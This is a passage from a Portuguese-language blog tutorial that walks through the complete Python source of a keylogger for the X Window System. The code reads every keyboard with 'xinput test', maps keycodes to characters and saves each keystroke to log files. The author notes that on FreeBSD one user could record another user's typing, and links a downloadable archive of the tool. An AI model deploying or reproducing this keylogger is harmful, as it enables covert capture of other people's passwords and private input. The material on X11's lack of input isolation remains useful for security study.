    ↳ Power Button                            	id=6	[slave  keyboard (3)]
    ↳ Power Button                            	id=7	[slave  keyboard (3)]
    ↳ Hewlett-Packard Company HP USB CCID Smartcard Keyboard	id=8	[slave  keyboard (3)]</pre>

Esse comando mostra o ID do teclado. Assim, de posse do id do teclado &#8212; no caso, o id=8 é esse dispositivo &#8211;, é possível capturar as teclas sendo digitadas. Para isso, basta utilizar o comando `xinput test`. Por exemplo:

<pre lang="sh">pedro@HAL9001:~$ xinput test 8
key release 36 
key press   28 
tkey release 28 
key press   26 
ekey release 26 
key press   39 
skey release 39 
key press   28 
tkey release 28 
key press   26 
ekey release 26</pre>

Assim, basta deixar rodando esse comando de background e utilizar um script de expressões regulares para substituir o código da tecla digitada pelo respectivo caractere. Para fazermos isso, facilitaremos nosso trabalho utilizando uma interface que permite usarmos comandos Bash como se fossem comandos nativos do Python. Tal interface foi desenvolvida por Andrew Moffat e pode ser encontrada em <a href="https://github.com/amoffat/sh" target="_blank">https://github.com/amoffat/sh</a>.

## Escrevendo o Keylogger

Como o objetivo principal do nosso script é executar expressões regulares para filtrar apenas o código das teclas (keycodes), começamos por definir as expressões que mais utilizaremos durante a execução:

<pre lang="python">KEYPRESS_REGEX = re.compile(r'key press +(\d+)')
KEYBOARD_REGEX = re.compile(r'(.*)Keyboard(.*)id=(\d+)(.*)')
KEYCODE_REGEX = re.compile(r'keycode +(\d+) = (.+)')</pre>

Em seguida, executamos o comando `xinput test` e capturamos a saída no Python. Como esse comando lista todos os dispositivos, usamos `KEYBOARD_REGEX` para filtrar os dispositivos de teclado. Fazemos isso pela seguinte função:

<pre lang="python">def get_listanables_keyboards():
    stdout = bash.xinput("list")
    keyboards = []
    for line in stdout:
        match = KEYBOARD_REGEX.match(line)
        if match and match.group(3).isdigit():
            keyboard = int(match.group(3))
            keyboards.append(keyboard)
    return keyboards</pre>

Devemos notar que essa função retorna uma **lista** de teclados. Isso porque nosso script está hábil a escutar vários dispositivos de teclado. Dessa forma, o script consiste em executar um `Keylogger` para cada dispositivo de teclado:

<pre lang="python">if __name__ == '__main__':
    keyboards = get_listanables_keyboards()
    for keyboard in keyboards:
        Keylogger(keyboard).start()
        signal_listener()</pre>

onde `signal_listener` escuta os sinais dados para a thread principal e envia esses sinais para as threads filhas:

<pre lang="python">def signal_listener():
    for sig in range(1, signal.NSIG):
        try:
            signal.signal(sig, signal.SIG_DFL)
        except RuntimeError:
            pass</pre>

### A Classe Keylogger

Como iremos escutar cada um dos teclados instalados no sistema, devemos gerar um keylogger para cada um deles. Assim, definimos uma classe que gera uma thread para cada um deles. Assim, começamos a definir essa classe como

<pre lang="python">class Keylogger(Thread):
    """Keylogger for a single keyboard"""
    def __init__(self, keyboard):
        Thread.__init__(self)
        self._keyboard = keyboard
        self._filename = 'keyboard%d.log' % self._keyboard
        self._file = open(self._filename, 'w+')
        self.__define_constants()

    def __del__(self):
        self.__exit__()

    def __exit__(self):
        self._file.close()

    def run(self):
        self._log()</pre>

onde `self._log()`, definida no corpo da thread, é a função que contém o núcleo do keylogger em si:

<pre lang="python">def _log(self):
        logger = bash.xinput("test", self._keyboard, _iter=True)
        keymap = self._get_keymap()
        try:
            for line in logger:
                match = KEYPRESS_REGEX.match(line)
                if match:
                    keycode = match.groups()[0]
                    key = keymap[keycode]
                    self._writen_file(key)
        except Exception:
            print "Salved into %s" % self._filename</pre>

Essa função utiliza a regex definida anteriormente para extrair cada código das teclas digitado e substituir pelo respectivo caractere. Após cada tecla ser digitada, ela é salva no arquivo respectivo ao código do teclado (`keyboard%d.log`). Abaixo segue essa classe completa, com todos os métodos listados:

<pre lang="python">class Keylogger(Thread):
    """Keylogger for a single keyboard"""
    def __init__(self, keyboard):
        Thread.__init__(self)
        self._keyboard = keyboard
        self._filename = 'keyboard%d.log' % self._keyboard
        self._file = open(self._filename, 'w+')
        self.__define_constants()

    def __del__(self):
        self.__exit__()

    def __exit__(self):
        self._file.close()

    def run(self):
        self._log()

    def __define_constants(self):
        self._special_chars = {
            'space': ' ',
            'apostrophe': "'",
            'BackSpace': ' (Backspace) ',
            'Return': ' \n',
            'period': '.',
            'Shift_L1': ' (Shift1) ',
            'Shift_L2': ' (Shift2) ',
            'Control_L': ' (ControlL) ',
            'ccedilla': 'ç',
            'backslash': '\\',
            'dead_tilde': '~',
            'Shift_L': ' (ShiftL) ',
            'Shift_R': ' (ShiftR) ',
            'minus': '-',
            'equal': '=',
            'Alt_L': ' (AltL) ',
            'Escape': ' (esc) ',
            'F1': ' (F1) ',
            'F2': ' (F2) ',
            'F3': ' (F3) ',
            'F4': ' (F4) ',
            'F5': ' (F5) ',
            'F6': ' (F6) ',
            'F7': ' (F7) ',
            'F8': ' (F8) ',
            'F9': ' (F9) ',
            'F10': ' (F10) ',
            'F11': ' (F11) ',
            'F12': ' (F12) ',
            'Num_Lock': ' (NumLock) ',
            'slash': '/',
            'bracketright': ']',
            'bracketleft': '[',
            'comma': ',',
            'semicolon': ';',
            'Scroll_Lock': ' (ScrollLock) ',
            'Home': ' (Home) ',
            'End': ' (End) ',
            'Prior': ' (PgUp) ',
            'Next': ' (PgDn) ',
            'Pause': ' (Pause) ',
            'Insert': ' (Insert) ',
            'Delete': ' (Del) ',
            'Print': ' (PrtScr) ',
            'Left': ' (Left) ',
            'Up': ' (Up) ',
            'Right': ' (Right) ',
            'Down': ' (Down) ',
        }

    def _log(self):
        logger = bash.xinput("test", self._keyboard, _iter=True)
        keymap = self._get_keymap()
        try:
            for line in logger:
                match = KEYPRESS_REGEX.match(line)
                if match:
                    keycode = match.groups()[0]
                    key = keymap[keycode]
                    self._writen_file(key)
        except Exception:
            print "Salved into %s" % self._filename

    def _writen_file(self, key):
        self._file.write(key)
        self._file.flush()
        os.fsync(self._file)

    def _sanitize(self, key_char):
        if key_char in self._special_chars:
            return self._special_chars[key_char]
        else:
            return key_char

    def _get_keymap(self):
        keymap = {}
        table = bash.xmodmap("-pke")
        for line in table:
            match = KEYCODE_REGEX.match(line)
            if match and match.groups()[1]:
                keycode = match.groups()[0]
                key_chars_group = match.groups()[1].split()
                key_main_char = key_chars_group[0]
                keymap[keycode] = self._sanitize(key_main_char)
        return keymap</pre>

O código completo desse keylogger está disponível em <a href="http://www.sawp.com.br/sources/PyXKeyLogger/pyxkeylogger.tar.gz" target="_blank">http://www.sawp.com.br/sources/PyXKeyLogger/pyxkeylogger.tar.gz</a>. Qualquer dúvida, reclamação, sugestão ou contribuição, contacte-me por e-mail: <sawp@sawp.com.br>. 

Finalmente, devemos considerar que esse script está limitado a gravar as teclas digitadas **apenas** no ambiente X. Além disso, é muito provável que os sistemas operacionais atuais estejam implementando alguma forma de _GUI_isolation_, o que irá limitar o nosso keylogger ainda mais, permitindo-o capturar somente as teclas digitadas pelo próprio usuário que executou o script.

Devemos ressaltar que em nosso teste no Freebsd 9.1 foi possível a um usuário capturar as teclas digitadas por outro usuário. Contudo, com o mesmo script executado no Ubuntu 12.10, isso não foi possível. Portanto, em situações onde não temos o X11 instalado, ou situações em que exista alguma forma de _GUI_isolation_, mas onde possuímos a senha de administrador, recomendamos a utilização do <a href="http://www.sawp.com.br/projects/pykl/" target="_blank">PyKL</a>.

## Referências

  1. Joanna Rutkowska&#8217;s blog: <a href="http://theinvisiblethings.blogspot.com.br/2011/04/linux-security-circus-on-gui-isolation.html" target="_blank">The Invisible Things Lab&#8217;s</a>
  2. Python-Bash (formerly pbs): <a href="https://github.com/amoffat/sh" target="_blank">https://github.com/amoffat/sh</a>
